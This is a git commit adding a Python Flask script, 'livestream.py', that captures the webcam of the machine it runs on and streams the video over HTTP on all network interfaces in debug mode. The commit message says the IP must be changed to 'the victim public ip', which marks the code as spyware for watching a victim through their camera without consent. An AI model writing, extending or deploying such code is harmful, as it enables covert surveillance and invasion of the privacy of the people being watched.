74e706c78b4281e0578cf8bf07025828e50c6af8
LopeKinz <48872005+LopeKinz@users.noreply.github.com>
2023-06-05 12:24:08 +0200

    Update livestream.py
    Need to change ip to the victim public ip

---
+++ src/livestream.py
@@ -0,0 +1,31 @@
+import cv2
+from flask import Flask, Response, render_template
+
+app = Flask(__name__)
+
+def generate_frames():
+    while True:
+        screen = cv2.VideoCapture(0)
+        ret, frame = screen.read()
+
+        if not ret:
+            break
+
+        ret, buffer = cv2.imencode('.jpg', frame)
+        frame = buffer.tobytes()
+
+        yield (b'--frame\r\n'
+               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+
+        screen.release()
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/video_feed')
+def video_feed():
+    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=True)
